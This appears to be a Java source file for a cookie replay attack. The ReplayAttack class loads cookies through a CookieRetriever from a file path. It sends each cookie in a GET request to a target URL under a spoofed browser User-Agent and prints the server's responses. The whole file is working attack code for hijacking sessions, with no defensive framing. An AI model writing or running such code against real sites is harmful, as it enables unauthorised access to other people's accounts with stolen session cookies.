import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

public class ReplayAttack {

	private String url;
	private ArrayList<String> cookieArray;

	public ReplayAttack(String path, String url) {
		this.url = url;
		cookieArray = new ArrayList<String>();
		CookieRetriever cr = new CookieRetriever(path);
		cookieArray = cr.getCookie();
		replayAttack();
	}

	public void replayAttack() {
		try {
			if (cookieArray.size() > 0) {
				for (int i = 0; i < cookieArray.size(); i++) {

					HttpURLConnection urlConn = (HttpURLConnection) new URL(url)
							.openConnection();
					urlConn.setRequestMethod("GET");
					urlConn.setRequestProperty("Cookie", cookieArray.get(i));
					urlConn.setRequestProperty(
							"User-Agent",
							"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1");
					urlConn.connect();

					BufferedReader serverData = new BufferedReader(
							new InputStreamReader(urlConn.getInputStream()));
					String line = new String();

					while ((line = serverData.readLine()) != null) {
						System.out.println(line);
					}
					serverData.close();
					urlConn.disconnect();
				}
			} else {
				System.out.println("Sorry, cannot find cookies");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}